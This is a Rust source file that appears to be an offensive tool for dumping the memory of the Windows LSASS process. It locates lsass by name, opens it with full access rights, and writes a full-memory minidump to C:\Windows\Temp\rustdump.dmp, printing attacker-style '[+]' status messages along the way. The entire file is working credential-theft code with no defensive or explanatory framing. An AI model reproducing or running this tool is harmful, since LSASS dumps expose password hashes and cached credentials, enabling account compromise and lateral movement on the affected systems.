use sysinfo::{System, ProcessExt, SystemExt, PidExt};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpWithFullMemory, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION, MINIDUMP_CALLBACK_INFORMATION};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
use windows::core::PCSTR;
use windows::s;

fn get_pid() -> u32 {
    let mut sys: System = System::new_all();
    sys.refresh_all();

    let mut pid: u32 = 0;
    for process in sys.processes_by_name("lsass") {
        pid = process.pid().as_u32();
    }
    return pid;
}

fn main() {
    println!("[+] Searching for process...");
    let pid: u32 = get_pid(); 
    println!("[+] Found pid {pid}");

    if pid == 0 {
        panic!("[!] Failed to find process!");
    }

    unsafe {
        println!("[+] Opening handle to process...");
        let h_proc: HANDLE = OpenProcess(PROCESS_ACCESS_RIGHTS(2035711), false, pid).expect("Error opening handle to process");

        const GENERIC_READ: u32 = 0x80000000;
        const GENERIC_WRITE: u32 = 0x40000000;

        let f_name: PCSTR = s!("C:\\Windows\\Temp\\rustdump.dmp");
        let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
        println!("[+] Creating file...");
        let h_file: HANDLE = CreateFileA(
            f_name,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_MODE(0),
            Some(&mut sa),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0)
        ).unwrap();

        let mini_excep: MINIDUMP_EXCEPTION_INFORMATION = MINIDUMP_EXCEPTION_INFORMATION::default();
        let mini_userstr: MINIDUMP_USER_STREAM_INFORMATION = MINIDUMP_USER_STREAM_INFORMATION::default();
        let mini_cb: MINIDUMP_CALLBACK_INFORMATION = MINIDUMP_CALLBACK_INFORMATION::default();

        println!("[+] Creating dump...");
        if !MiniDumpWriteDump(
            h_proc,
            pid,
            h_file,
            MiniDumpWithFullMemory,
            Some(&mini_excep),
            Some(&mini_userstr),
            Some(&mini_cb)
        ).as_bool() {
            let e = GetLastError();
            panic!("Error creating dump! {:?}", e);
        }
        CloseHandle(h_file);
        println!("[+] Dump file saved to {}", f_name.to_string().unwrap());
    }
}
